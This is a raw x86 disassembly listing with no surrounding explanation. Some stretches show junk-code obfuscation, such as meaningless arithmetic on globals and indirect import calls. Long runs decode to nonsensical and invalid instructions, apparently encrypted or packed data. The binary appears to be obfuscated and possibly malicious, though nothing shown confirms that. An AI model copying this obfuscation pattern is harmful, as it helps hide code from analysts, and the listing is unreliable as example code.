  40b308:	adc    DWORD PTR [ebx+0x5c],edi
  40b30b:	mov    WORD PTR [ebx-0x80],cs
  40b30e:	das    
  40b30f:	call   0xff977ba
  40b314:	push   eax
  40b315:	adc    DWORD PTR ds:0x42832b,0x4282e3
  40b31f:	call   0x416c20
  40b324:	sbb    esi,DWORD PTR ds:0x4282d7
  40b32a:	mov    ecx,DWORD PTR [ebp-0x20]
  40b32d:	adc    esi,0x2986
  40b333:	mov    esi,DWORD PTR [ebp-0x1c]
  40b336:	sbb    DWORD PTR ds:0x42826b,0x42832b
  40b340:	push   0x5f43
  40b345:	or     edx,0x69b4
  40b34b:	sub    DWORD PTR ds:0x4283c3,0x42832b
  40b355:	push   0x1657
  40b35a:	xor    DWORD PTR ds:0x4283ab,0x42829f
  40b364:	or     eax,0x528b
  40b369:	xor    edx,esi
  40b36b:	xor    eax,ecx
  40b36d:	sub    DWORD PTR ds:0x4283df,0x42827f
  40b377:	push   edx
  40b378:	push   eax
  40b379:	call   0x416c20
  40b37e:	xor    ecx,ecx
  40b380:	or     ecx,DWORD PTR ds:0x4282df
  40b386:	adc    DWORD PTR ds:0x4281d3,ecx
  40b38c:	mov    ecx,DWORD PTR [ebp-0x28]
  40b38f:	xor    DWORD PTR ds:0x428347,ecx
  40b395:	mov    esi,DWORD PTR [ebp-0x24]
  40b398:	and    DWORD PTR ds:0x4282b3,0x42829f
  40b3a2:	push   esi
  40b3a3:	add    DWORD PTR ds:0x4281ab,0x5412
  40b3ad:	push   ecx
  40b3ae:	sub    DWORD PTR ds:0x4283c7,0x27f7
  40b3b8:	push   edx
  40b3b9:	push   eax
  40b3ba:	sub    DWORD PTR ds:0x4281a7,0x4283db
  40b3c4:	call   0x4220b1
  40b3c9:	mov    DWORD PTR [ebp-0x30],eax
  40b3cc:	add    eax,DWORD PTR ds:0x4282ab
  40b3d2:	mov    DWORD PTR [ebp-0x2c],edx
  40b3d5:	cmp    DWORD PTR ds:0x4282db,0x0
  40b3dc:	not    esi
  40b3de:	mov    DWORD PTR ds:0x4282c3,0x6e42
  40b3e8:	jmp    0x40b4a9
  40b3ed:	not    DWORD PTR ds:0x42835b
  40b3f3:	mov    eax,ds:0x4282d3
  40b3f8:	cmp    DWORD PTR ds:0x4282db,0x0
  40b3ff:	jl     0x40b428
  40b405:	push   0x2496
  40b40a:	push   DWORD PTR [ebp-0x28]
  40b40d:	call   DWORD PTR ds:0x428f1c
  40b413:	xor    edx,ecx
  40b415:	and    DWORD PTR ds:0x4281cb,edx
  40b41b:	movzx  ecx,WORD PTR ds:0x4282bb
  40b422:	or     DWORD PTR ds:0x42834b,ecx
  40b428:	add    esi,edx
  40b42a:	adc    DWORD PTR ds:0x4281a7,0x1bfc
  40b434:	sub    esi,0x4a2f
  40b43a:	cmp    DWORD PTR ds:0x4283d3,0x0
  40b441:	mov    DWORD PTR ds:0x42834b,ecx
  40b447:	mov    DWORD PTR ds:0x4283cb,0x318c
  40b451:	mov    DWORD PTR ds:0x4283db,0x431a
  40b45b:	jmp    0x40b4a9
  40b460:	mov    DWORD PTR ds:0x4282a3,0x461b
  40b46a:	mov    DWORD PTR ds:0x4282df,0x63d9
  40b474:	cmp    DWORD PTR ds:0x4283d3,0x0
  40b47b:	jbe    0x40b49b
  40b481:	push   DWORD PTR [ebp-0x1c]
  40b484:	push   0x184b
  40b489:	call   DWORD PTR ds:0x428f20
  40b48f:	xor    edx,DWORD PTR ds:0x4282b3
  40b495:	adc    ecx,DWORD PTR ds:0x4283bb
  40b49b:	and    DWORD PTR ds:0x4281ab,0x404c
  40b4a5:	and    edx,esi
  40b4a7:	add    ecx,edx
  40b4a9:	mov    DWORD PTR [ebp-0x10],0x5fa8
  40b4b0:	movzx  eax,WORD PTR ds:0x4282bf
  40b4b7:	xor    DWORD PTR ds:0x4283d3,eax
  40b4bd:	mov    DWORD PTR [ebp-0xc],0x1751
  40b4c4:	dec    DWORD PTR ds:0x4282a3
  40b4ca:	mov    DWORD PTR [ebp-0x20],0x5e90
  40b4d1:	mov    DWORD PTR [ebp-0x1c],0xfc1
  40b4d8:	cmp    DWORD PTR ds:0x4281bf,0x0
  40b4df:	mov    edx,0x29d6
  40b4e4:	mov    ecx,0x5377
  40b4e9:	not    esi
  40b4eb:	movzx  ecx,BYTE PTR ds:0x42819b
  40b4f2:	jmp    0x40b54e
  40b4f7:	mov    DWORD PTR ds:0x42826b,0x9f5
  40b501:	mov    DWORD PTR ds:0x4282e7,0x1c35
  40b50b:	cmp    DWORD PTR ds:0x4281bf,0x0
  40b512:	je     0x40b542
  40b518:	push   0x428013
  40b51d:	push   0x400000
  40b522:	call   DWORD PTR ds:0x428e08
  40b528:	sbb    DWORD PTR ds:0x4282d7,edi
  40b52e:	mov    ecx,DWORD PTR ds:0x42820f
  40b534:	xor    edx,edx
  40b536:	or     edx,DWORD PTR ds:0x4283fb
  40b53c:	sub    ecx,edx
  40b53e:	imul   ecx,DWORD PTR [ecx+edx*1]
  40b542:	and    esi,DWORD PTR ds:0x4281db
  40b548:	sbb    esi,0x2386
  40b54e:	mov    DWORD PTR [ebp-0x28],0x7044
  40b555:	mov    DWORD PTR [ebp-0x24],0x7bf
  40b55c:	mov    eax,DWORD PTR [ebp-0x28]
  40b55f:	sbb    edx,DWORD PTR ds:0x428283
  40b565:	mov    ecx,DWORD PTR [ebp-0x24]
  40b568:	not    DWORD PTR ds:0x4282b3
  40b56e:	mov    edx,DWORD PTR [ebp-0x20]
  40b571:	or     DWORD PTR ds:0x4282e3,ecx
  40b577:	mov    esi,DWORD PTR [ebp-0x1c]
  40b57a:	sbb    DWORD PTR ds:0x4283bb,0x428283
  40b584:	jmp    0x40b97a
  40b589:	adc    DWORD PTR [edx+0x10],esi
  40b58c:	packssdw mm5,QWORD PTR [edx+0xf]
  40b590:	jb     0x40b5e9
  40b592:	jnp    0x40b598
  40b594:	push   0xffffffef
  40b596:	mov    ecx,0x130a7c77
  40b59b:	sbb    BYTE PTR [eax],bl
  40b59d:	outs   dx,BYTE PTR ds:[esi]
  40b59e:	adc    bl,BYTE PTR [eax]
  40b5a0:	sbb    BYTE PTR [esi],ah
  40b5a2:	popa   
  40b5a3:	xchg   ebp,eax
  40b5a4:	fisubr WORD PTR [ebp+0xd]
  40b5a7:	ja     0x40b588
  40b5a9:	xor    DWORD PTR [edi-0x4],0xcf3bbfc5
  40b5b0:	jle    0x40b58f
  40b5b2:	sar    edi,cl
  40b5b4:	and    DWORD PTR [edx+0x7451f692],ebx
  40b5ba:	mov    edx,DWORD PTR [edx+0x79e05767]
  40b5c0:	add    BYTE PTR [edi-0x4a],dl
  40b5c3:	sub    DWORD PTR [edi+esi*1+0x2e86f787],eax
  40b5ca:	xor    edx,edi
  40b5cc:	or     eax,0x2bb331a2
  40b5d1:	ins    DWORD PTR es:[edi],dx
  40b5d2:	loopne 0x40b583
  40b5d4:	cwde   
  40b5d5:	test   edi,ebx
  40b5d7:	das    
  40b5d8:	lock mov dh,0xdf
  40b5db:	mov    edi,0x36c7baff
  40b5e0:	out    dx,al
  40b5e1:	(bad)  
  40b5e2:	mov    al,ds:0x483187f8
  40b5e7:	xchg   esp,eax
  40b5e8:	mov    ebx,0xb048894b
  40b5ed:	or     edx,DWORD PTR [eax+0x4ba4baa2]
  40b5f3:	jle    0x40b62a
  40b5f5:	in     eax,0x23
  40b5f7:	pop    ss
  40b5f8:	popf   
  40b5f9:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  40b5fb:	loop   0x40b5d6
  40b5fd:	push   esi
  40b5fe:	mov    ecx,0xb64c1aaa
  40b603:	gs dec ecx
  40b605:	(bad)  
  40b608:	shl    DWORD PTR [ebp+0x7e3d78c7],0xf4
  40b60f:	mov    ah,0x14
  40b611:	xchg   ebp,eax
  40b612:	imul   BYTE PTR [eax]
  40b614:	xor    BYTE PTR [ebp+0x4bda25b6],ch
  40b61a:	adc    ebp,DWORD PTR ds:0xf18baa2c
  40b620:	daa    
  40b621:	mov    dl,0x45
  40b623:	sbb    al,0x88
  40b625:	dec    esi
  40b626:	cmp    edx,ebx
  40b628:	jmp    0xf16a0ef9
  40b62d:	pop    edx
  40b62e:	addr16 (bad) 
  40b630:	retf   
  40b631:	inc    ebp
  40b632:	aas    
  40b633:	out    dx,eax
  40b634:	loop   0x40b5c9
  40b636:	mov    al,ds:0x405bdb0a
  40b63b:	jecxz  0x40b655
  40b63d:	out    0x4,al
  40b63f:	or     al,0x1f
  40b641:	pmaxub mm3,QWORD PTR [esi+esi*1]
  40b645:	mov    ?,WORD PTR [esp+eiz*2-0x73]
  40b649:	rcr    eax,0x49
  40b64c:	(bad)  [esi+0x793800c0]
  40b652:	cmp    ecx,DWORD PTR [ebx]
  40b654:	les    edx,FWORD PTR [esi+0x31]
  40b657:	mov    bl,0xc8
  40b659:	push   eax
  40b65a:	or     BYTE PTR [ecx+0x7f19bb99],dl
  40b660:	and    ah,BYTE PTR [ebp+0x64]
  40b663:	sti    
  40b664:	jg     0x40b672
  40b666:	push   edx
  40b667:	in     eax,dx
  40b668:	popf   
  40b669:	ds pusha 
  40b66b:	dec    eax
  40b66c:	xchg   edx,eax
  40b66d:	push   esi
  40b66e:	sbb    eax,DWORD PTR [ebx]
  40b670:	or     bh,BYTE PTR [ebp+0x62]
  40b673:	shr    esi,0xd5
  40b676:	dec    ebp
  40b677:	jmp    0x40b5ff
  40b679:	sub    edi,DWORD PTR [edx]
  40b67b:	sbb    eax,0x46562611
  40b680:	and    bh,dh
  40b682:	add    esi,edx
  40b684:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b685:	ror    DWORD PTR [eax+0x4d990c00],0x2d
  40b68c:	mov    eax,ds:0x69b7d519
  40b691:	mov    ecx,0xda8f2ca0
  40b696:	fidiv  DWORD PTR [esi]
  40b698:	retf   0x26a7
  40b69b:	popf   
  40b69c:	adc    edi,DWORD PTR [esp+eax*2-0x5bfd5a6f]
  40b6a3:	mov    dh,0x57
  40b6a5:	(bad)  
  40b6a6:	into   
  40b6a7:	lea    esp,[ebx]
  40b6a9:	or     ch,0x1e
  40b6ac:	sbb    al,0xff
  40b6ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6af:	push   eax
  40b6b0:	iret   
  40b6b1:	ficom  WORD PTR [ecx+0x78]
  40b6b4:	or     BYTE PTR [ecx+0x14cdb1b6],dl
  40b6ba:	dec    esi
  40b6bb:	ret    
  40b6bc:	stos   BYTE PTR es:[edi],al
  40b6bd:	stos   DWORD PTR es:[edi],eax
  40b6be:	aam    0xec
  40b6c0:	mov    dl,0xfb
  40b6c2:	xlat   BYTE PTR ds:[ebx]
  40b6c3:	push   ecx
  40b6c4:	pop    ebx
  40b6c5:	pslld  mm7,QWORD PTR [ecx+0x2f2b3aef]
  40b6cc:	lds    ebp,FWORD PTR ds:0x8507d690
  40b6d2:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b6d4:	fs jmp 0x49b99440
  40b6da:	cmp    esi,DWORD PTR [ecx]
  40b6dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6dd:	adc    eax,0x7e67f171
  40b6e2:	or     ecx,DWORD PTR [edx]
  40b6e4:	sub    bh,dl
  40b6e6:	call   0x8df14acf
  40b6eb:	repnz pop eax
  40b6ed:	xor    esi,0x59c7ec94
  40b6f3:	pop    ds
  40b6f4:	sub    DWORD PTR ds:0x7af9ec99,edx
  40b6fa:	lock outs dx,DWORD PTR ds:[esi]
  40b6fc:	mov    WORD PTR [ebx+0x5b],ss
  40b6ff:	je     0x40b695
  40b701:	out    dx,al
  40b702:	addr16 out dx,eax
  40b704:	xor    al,0x20
  40b706:	retf   
  40b707:	pop    edi
  40b708:	pop    edx
  40b709:	add    al,0xf1
  40b70b:	ins    BYTE PTR es:[edi],dx
  40b70c:	psrld  mm3,QWORD PTR [ecx]
  40b70f:	lock add DWORD PTR [ebx-0xd],0xffffffc5
  40b714:	xor    DWORD PTR [ecx],edx
  40b716:	xchg   edx,eax
  40b717:	outs   dx,BYTE PTR ds:[esi]
  40b718:	xor    BYTE PTR [ebp-0x1f696776],bh
  40b71e:	idiv   DWORD PTR [edx+edi*2+0x1b191f94]
  40b725:	adc    BYTE PTR [edx+edi*4-0x19ed04a],bl
  40b72c:	push   cs
  40b72d:	xor    BYTE PTR [eax+edi*2-0x6d24c67d],0xa4
  40b735:	add    esp,DWORD PTR [ebp+0x2a]
  40b738:	add    BYTE PTR [ebx-0x77f023e8],cl
  40b73e:	sbb    DWORD PTR [ebx+0x4b421d26],ecx
  40b744:	cld    
  40b745:	sbb    eax,0x3d9c5f8
  40b74a:	adc    eax,0xd286e1b5
  40b74f:	push   ss
  40b750:	cmp    ebx,ebx
  40b752:	shl    edi,0xbb
  40b755:	or     eax,0x44f76082
  40b75a:	add    BYTE PTR [ecx+0x4c],al
  40b75d:	test   DWORD PTR [ecx-0x3a],edx
  40b760:	adc    eax,0xa5535951
  40b765:	adc    BYTE PTR [ebx-0x53],bl
  40b768:	mov    bh,0xc7
  40b76a:	lock popf 
  40b76c:	loop   0x40b773
  40b76e:	int    0x33
  40b770:	mul    BYTE PTR [esi]
  40b772:	jo     0x40b7da
  40b774:	dec    ebp
  40b775:	push   esp
  40b776:	cmp    ebp,ebp
  40b778:	ins    DWORD PTR es:[edi],dx
  40b779:	lods   eax,DWORD PTR ds:[esi]
  40b77a:	jge    0x40b726
  40b77c:	call   0x327:0x1f000342
  40b783:	push   ds
  40b784:	mov    fs,WORD PTR [eax+0x27]
  40b787:	fcmovb st,st(6)
  40b789:	sub    edx,DWORD PTR [edx-0x51447303]
  40b78f:	and    DWORD PTR [eax-0x2465b420],ecx
  40b795:	sbb    ebp,esi
  40b797:	cld    
  40b798:	ficom  WORD PTR [edi+edi*1+0x12]
  40b79c:	add    DWORD PTR [edi],eax
  40b79e:	es stc 
  40b7a0:	call   0xe2c5:0x6b5f883c
  40b7a7:	jae    0x40b7b2
  40b7a9:	adc    BYTE PTR [ecx],ch
  40b7ab:	jae    0x40b789
  40b7ad:	data16 jg 0x40b7ca
  40b7b0:	test   BYTE PTR [ebx+0x2a],ch
  40b7b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b7b4:	jecxz  0x40b75f
  40b7b6:	pop    ebx
  40b7b7:	add    DWORD PTR [eax],ebp
  40b7b9:	and    al,BYTE PTR [edx]
  40b7bb:	leave  
  40b7bc:	mov    edi,0xd2e65fbe
  40b7c1:	xor    BYTE PTR [eax+0x3e],0x51
  40b7c5:	test   eax,0x77430e35
  40b7ca:	or     DWORD PTR [edx],0xb94727a6
  40b7d0:	in     eax,dx
  40b7d1:	(bad)  
  40b7d2:	aad    0xa9
  40b7d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b7d5:	xchg   BYTE PTR [ebp+ecx*8-0x5d147fe4],bl
  40b7dc:	aaa    
  40b7dd:	push   ebx
  40b7de:	aaa    
  40b7df:	popa   
  40b7e0:	sub    DWORD PTR [edi],0x4c
  40b7e3:	xlat   BYTE PTR ds:[ebx]
  40b7e4:	add    ebx,esp
  40b7e6:	(bad)  
  40b7e7:	pop    edi
  40b7e8:	loopne 0x40b83c
  40b7ea:	jns    0x40b7e3
  40b7ec:	push   esp
  40b7ed:	push   ss
  40b7ee:	aaa    
  40b7ef:	adc    al,0xc
  40b7f1:	lods   eax,DWORD PTR ds:[esi]
  40b7f2:	lods   al,BYTE PTR ds:[esi]
  40b7f3:	shr    edx,1
  40b7f5:	sub    BYTE PTR [ecx-0x4a63ec3d],ch
  40b7fb:	test   DWORD PTR [eax-0x66],ecx
  40b7fe:	or     esp,DWORD PTR [esi+0x18]
  40b801:	ficom  DWORD PTR [ebx]
  40b803:	pop    ebp
  40b804:	xor    BYTE PTR [eax-0xd],ah
  40b807:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b808:	mov    dh,0xff
  40b80a:	sub    bl,BYTE PTR [ecx-0x1e]
  40b80d:	sbb    al,dh
  40b80f:	mov    eax,ds:0xbe86a5c3
  40b814:	mov    ah,0x64
  40b816:	stc    
  40b817:	cmp    DWORD PTR [esi],esi
  40b819:	dec    esi
  40b81a:	test   BYTE PTR [eax+0x3b0beb1b],0xd8
  40b821:	fs push ss
  40b823:	loope  0x40b878
  40b825:	fist   WORD PTR [esi+ebp*8]
  40b828:	pop    ds
  40b829:	cmp    eax,0xd7ca3067
  40b82e:	or     eax,0x1d286fb3
  40b833:	int    0xe6
  40b835:	mov    WORD PTR [ecx+0x54],?
  40b838:	add    al,bh
  40b83a:	mov    ebp,DWORD PTR [edx]
  40b83c:	dec    eax
  40b83d:	sbb    DWORD PTR [eax-0x35],0x666ab835
  40b844:	sar    BYTE PTR [esi],cl
  40b846:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b847:	in     eax,0x67
  40b849:	(bad)  
  40b84a:	lock shl ah,cl
  40b84d:	dec    ebx
  40b84e:	lahf   
  40b84f:	sub    al,BYTE PTR [ebx-0x654de416]
  40b855:	adc    cl,bl
  40b857:	nop
  40b858:	stos   DWORD PTR es:[edi],eax
  40b859:	mov    ds:0x5ab65224,eax
  40b85e:	nop
  40b85f:	fwait
  40b860:	sbb    BYTE PTR [ecx+0x580c2d8e],bl
  40b866:	jl     0x40b88a
  40b868:	dec    ecx
  40b869:	das    
  40b86a:	xchg   esp,eax
  40b86b:	loopne 0x40b871
  40b86d:	push   es
  40b86e:	add    al,0x2
  40b870:	(bad)  
  40b871:	push   ds
  40b872:	xchg   ebx,eax
  40b874:	sub    BYTE PTR [edi],dl
  40b876:	fstp   st(3)
  40b878:	(bad)  
  40b879:	jbe    0x40b86f
  40b87b:	clc    
  40b87c:	add    DWORD PTR [ebp-0x34e1d96b],esp
  40b882:	in     al,dx
  40b883:	mov    eax,ds:0x62397da0
  40b888:	les    edi,FWORD PTR [esi+0xd6e3c83]
  40b88e:	add    al,0x8a
  40b890:	pop    edx
  40b891:	jbe    0x40b8d0
  40b893:	push   ds
  40b894:	cli    
  40b895:	(bad)
  40b898:	sub    al,0x24
  40b89a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b89b:	cli    
  40b89c:	push   0xffffffb4
  40b89e:	xor    dh,0xe8
  40b8a1:	cwde   
  40b8a2:	ret    0x8099
  40b8a5:	call   0x288:0x4314db1c
  40b8ac:	push   0xffffffbf
  40b8ae:	rol    DWORD PTR [edx-0x5b267d5e],cl
  40b8b4:	es pop es
  40b8b6:	adc    dh,ah
  40b8b8:	or     al,0xc7
  40b8ba:	call   0xec5b:0xb2fe4141
  40b8c1:	cs sub eax,0xb48f76e3
  40b8c7:	pop    eax
  40b8c8:	(bad)  
  40b8c9:	outs   dx,BYTE PTR ds:[esi]
  40b8cb:	arpl   si,bx
  40b8cd:	mov    cl,0xa7
  40b8cf:	cwde   
  40b8d0:	push   ebp
  40b8d1:	rol    BYTE PTR [ecx-0x34],0x45
  40b8d5:	xchg   ebp,edx
  40b8d7:	jno    0x40b8ba
  40b8d9:	or     ch,BYTE PTR [eax+ebx*2-0x75]
  40b8dd:	cmp    eax,0xab5f5634
  40b8e2:	push   cs
  40b8e3:	cmp    esi,eax
  40b8e5:	loopne 0x40b885
  40b8e7:	cld    
  40b8e8:	lahf   
  40b8e9:	or     al,0x13
  40b8eb:	cmp    ah,ch
  40b8ed:	daa    
  40b8ee:	xor    eax,0xf30ff747
  40b8f3:	inc    ebp
  40b8f4:	test   DWORD PTR [edx+0xa10bd0],0x55d63c80
  40b8fe:	fwait
  40b8ff:	jbe    0x40b92d
  40b901:	xchg   edi,eax
  40b902:	test   eax,0x402011db
  40b907:	ret    0x119c
  40b90a:	loop   0x40b8ea
  40b90c:	stc    
  40b90d:	stos   BYTE PTR es:[edi],al
  40b90e:	ror    DWORD PTR [eax+0x7d],cl
  40b911:	stos   DWORD PTR es:[edi],eax
  40b912:	shr    ah,cl
  40b914:	aaa    
  40b915:	fiadd  DWORD PTR [esi+edi*8+0x59554b43]
  40b91c:	dec    esi
  40b91d:	sbb    esp,DWORD PTR [ebx+0x47f919b6]
  40b923:	sub    eax,0x2cab1b65
  40b928:	dec    ebx
  40b929:	nop
  40b92a:	adc    DWORD PTR [ebx+0x77],edx
  40b92d:	(bad)  
  40b92e:	fcmovbe st,st(1)
  40b930:	addr16 push ebp
  40b932:	in     al,dx
  40b933:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b934:	and    DWORD PTR [ecx+0x1c],ebx
  40b937:	xchg   ebx,eax
  40b938:	cwde   
  40b939:	(bad)  
  40b93a:	mov    WORD PTR [ecx+0x15],ss
  40b93d:	push   0xffffff81
  40b93f:	cli    
  40b940:	add    edx,DWORD PTR ds:0xfc83e3c4
  40b946:	inc    ecx
  40b947:	inc    ecx
  40b948:	es xor al,cl
  40b94b:	sbb    BYTE PTR [eax+0x33],ch
  40b94e:	imul   ebp,DWORD PTR [ebp+0x626a52e3],0xc20b469c
  40b958:	popa   
  40b959:	mov    dh,0xc1
  40b95b:	(bad)  
  40b95c:	leave  
  40b95d:	cmp    eax,0x2b7d41a4
  40b962:	outs   dx,DWORD PTR ds:[esi]
  40b963:	pusha  
  40b964:	xchg   BYTE PTR [ebx+ebx*4-0x56338b72],ch
  40b96b:	jge    0x40b94c
  40b96d:	in     al,0x45
  40b96f:	xchg   edi,eax
  40b970:	(bad)  
  40b971:	in     eax,0x59
  40b973:	sbb    cl,BYTE PTR [esp+esi*4]
  40b976:	cmc    
  40b977:	mov    ch,0x50
  40b979:	jp     0x40b980
  40b97b:	pop    esp
  40b97c:	xor    eax,0xd1810000
  40b981:	sbb    DWORD PTR [eax],ecx
  40b983:	add    BYTE PTR [eax],al
  40b985:	adc    DWORD PTR ds:0x428333,0xc1d
  40b98f:	or     eax,edx
  40b991:	mov    edx,DWORD PTR [ebp-0x10]
  40b994:	or     ecx,esi
  40b996:	and    esi,DWORD PTR ds:0x4282b7
  40b99c:	mov    esi,DWORD PTR [ebp-0xc]
  40b99f:	and    DWORD PTR ds:0x428347,0x1cd5
  40b9a9:	or     eax,edx
  40b9ab:	cmp    DWORD PTR ds:0x42834f,0x0
  40b9b2:	mov    edx,0xd4e
  40b9b7:	not    edx
  40b9b9:	mov    DWORD PTR ds:0x4282b7,0x1f80
  40b9c3:	jmp    0x40ba42
  40b9c8:	mov    DWORD PTR ds:0x42834f,0x2492
  40b9d2:	mov    DWORD PTR ds:0x4283df,0xa5a
  40b9dc:	cmp    DWORD PTR ds:0x42834f,0x0
  40b9e3:	jbe    0x40ba20
  40b9e9:	push   DWORD PTR [ebp-0x1c]
  40b9ec:	push   0x148d
  40b9f1:	call   DWORD PTR ds:0x428e0c
  40b9f7:	adc    DWORD PTR ds:0x4283db,0x175a
  40ba01:	not    edx
  40ba03:	movzx  edx,WORD PTR ds:0x428337
  40ba0a:	sub    edx,DWORD PTR ds:0x42834b
  40ba10:	mov    DWORD PTR ds:0x428337,edx
  40ba16:	adc    DWORD PTR ds:0x428333,0x62d2
  40ba20:	mov    edx,DWORD PTR ds:0x4281a7
  40ba26:	xor    DWORD PTR ds:0x4283d3,edx
  40ba2c:	or     DWORD PTR ds:0x42827f,0x5c0
  40ba36:	mov    edx,DWORD PTR ds:0x4282b7
  40ba3c:	or     DWORD PTR ds:0x428353,edx
  40ba42:	mov    edx,DWORD PTR [ebp-0x30]
  40ba45:	or     ecx,esi
  40ba47:	mov    esi,DWORD PTR [ebp-0x2c]
  40ba4a:	or     eax,0xf34
  40ba4f:	or     ecx,0x6c90
  40ba55:	cmp    edx,eax
  40ba57:	jne    0x40ba65
  40ba5d:	cmp    esi,ecx
  40ba5f:	je     0x40cc06
  40ba65:	mov    DWORD PTR [ebp-0x30],0x5ddc
  40ba6c:	mov    DWORD PTR [ebp-0x2c],0x7433
  40ba73:	mov    eax,DWORD PTR [ebp-0x30]
  40ba76:	mov    ecx,DWORD PTR [ebp-0x2c]
  40ba79:	xor    ecx,0xfffffd1f
  40ba7f:	xor    eax,0xffff9fff
  40ba84:	and    ecx,0x6e0
  40ba8a:	and    eax,0x6244
  40ba8f:	mov    DWORD PTR [ebp-0x10],eax
  40ba92:	jmp    0x40be88
  40ba97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba99:	test   al,0x41
  40ba9b:	test   al,0x3d
  40ba9d:	sbb    al,0x1c
  40ba9f:	fdiv   QWORD PTR [edx]
  40baa1:	mov    bl,0x7c
  40baa3:	jle    0x40badf
  40baa5:	xchg   ebp,eax
  40baa6:	mov    esp,0x18180d60
  40baab:	outs   dx,BYTE PTR ds:[esi]
  40baac:	adc    bl,BYTE PTR [eax]
  40baae:	sbb    al,ch
  40bab0:	xlat   BYTE PTR ds:[ebx]
  40bab1:	(bad)  
  40bab2:	fbstp  TBYTE PTR [esi]
  40bab4:	xchg   ebp,eax
  40bab5:	test   al,0x40
  40bab7:	lahf   
  40bab8:	jmp    0x66439337
  40babd:	jo     0x40ba8f
  40babf:	les    eax,FWORD PTR [edx-0x4bddb4bc]
  40bac5:	inc    esp
  40bac6:	in     eax,0x4d
  40bac8:	fnop   
  40baca:	cdq    
  40bacb:	mov    bl,0x96
  40bacd:	aaa    
  40bace:	jle    0x40bb19
  40bad0:	loop   0x40ba89
  40bad2:	and    bl,BYTE PTR [ebp+0x11]
  40bad5:	sahf   
  40bad6:	mov    ?,WORD PTR [esi]
  40bad8:	and    dl,BYTE PTR [ecx+0x53]
  40badb:	sbb    bl,BYTE PTR [edx]
  40badd:	jno    0x40bab9
  40badf:	int    0x6c
  40bae1:	repnz (bad) 
  40bae3:	fsubr  QWORD PTR [edi+eax*1+0x4a]
  40bae7:	push   ecx
  40bae8:	mov    eax,ecx
  40baea:	(bad)  
  40baeb:	mov    edi,0xf02cdbf4
  40baf0:	shl    DWORD PTR ds:0x187e1994,1
  40baf6:	add    ebx,esp
  40baf8:	cld    
  40baf9:	sub    al,0xf7
  40bafb:	jg     0x40bb53
  40bafd:	xchg   ebx,eax
  40bafe:	rol    cl,cl
  40bb00:	jnp    0x40baf2
  40bb02:	pop    ss
  40bb03:	mov    ds:0xfd6a3f4,eax
  40bb08:	imul   ecx,DWORD PTR ds:0x8eeead36,0xffffffb0
  40bb0f:	or     eax,0x1f8032b3
  40bb14:	dec    ebx
  40bb15:	inc    ecx
  40bb16:	and    BYTE PTR [esp+esi*2-0x6b],bh
  40bb1a:	daa    
  40bb1b:	jmp    0x99b7:0x93e5ec8e
  40bb22:	test   BYTE PTR ds:0x511dd687,dl
  40bb28:	mov    DWORD PTR [edx+0x6a3869e8],esi
  40bb2e:	ficomp DWORD PTR cs:[esi+0x689b4129]
  40bb35:	mov    dl,0xec
  40bb37:	outs   dx,BYTE PTR ds:[esi]
  40bb38:	call   0x94cd:0xaea4f1dc
  40bb3f:	mov    esp,0x5fe749a4
  40bb44:	jae    0x40bb05
  40bb46:	push   0x753b1929
  40bb4b:	pop    ss
  40bb4c:	mov    esi,0xf333151f
  40bb51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb52:	lods   eax,DWORD PTR ds:[esi]
  40bb53:	inc    edx
  40bb54:	aaa    
  40bb55:	cdq    
  40bb56:	fcomp  DWORD PTR [edi]
  40bb58:	or     al,0xb0
  40bb5a:	popf   
  40bb5b:	enter  0x46c9,0x5d
  40bb5f:	xor    eax,0x69a608c
  40bb64:	sahf   
  40bb65:	or     edi,DWORD PTR [ecx+0x68]
  40bb68:	(bad)  [ebx-0x25f553c1]
  40bb6e:	xchg   ebp,eax
  40bb6f:	mov    esp,0xf9f14993
  40bb74:	imul   edx,DWORD PTR [edx+0x390d8633],0x11
  40bb7b:	test   BYTE PTR [edx],0xcb
  40bb7e:	cld    
  40bb7f:	inc    edi
  40bb80:	das    
  40bb81:	hlt    
  40bb82:	retf   0xd4c6
  40bb85:	jae    0x40bbf8
  40bb87:	cs std 
  40bb89:	adc    BYTE PTR ds:[esi-0x5d],ch
  40bb8d:	xchg   edi,eax
  40bb8e:	sub    BYTE PTR [ecx+ebp*8-0x49],bl
  40bb92:	(bad)  
  40bb94:	mov    eax,ebp
  40bb96:	xor    DWORD PTR [eax-0x21],esp
  40bb99:	fisub  DWORD PTR ds:0x2d6d584e
  40bb9f:	scas   al,BYTE PTR es:[edi]
  40bba0:	inc    eax
  40bba1:	pushf  
  40bba2:	stos   BYTE PTR es:[edi],al
  40bba3:	(bad)  
  40bba4:	retf   0x313
  40bba7:	xchg   DWORD PTR [edx],edi
  40bba9:	in     al,0xf0
  40bbab:	lock mov ebx,0xdb8519aa
  40bbb1:	(bad)  
  40bbb2:	mov    edi,0xebfa94da
  40bbb7:	arpl   bx,di
  40bbb9:	call   0x6a38:0x284535d
  40bbc0:	retf   0x47d3
  40bbc3:	int    0x9a
  40bbc5:	jne    0x40bbdc
  40bbc7:	in     eax,0x32
  40bbc9:	test   eax,0x97a27058
  40bbce:	cmp    DWORD PTR [edx],ecx
  40bbd0:	push   edx
  40bbd1:	xchg   edx,eax
  40bbd2:	mov    ds:0x17314e5a,al
  40bbd7:	xchg   esi,eax
  40bbd8:	ins    DWORD PTR es:[edi],dx
  40bbd9:	rcr    DWORD PTR [edi-0x58],0x76
  40bbdd:	call   DWORD PTR [edx]
  40bbdf:	push   edx
  40bbe0:	jmp    0x5c9a496
  40bbe5:	fstp   QWORD PTR [edx-0x41]
  40bbe8:	ss std 
  40bbea:	gs pop esi
  40bbec:	fptan  
  40bbee:	call   0x503e4dcd
  40bbf3:	(bad)  
  40bbf5:	or     al,0x48
  40bbf7:	enter  0xad64,0xfe
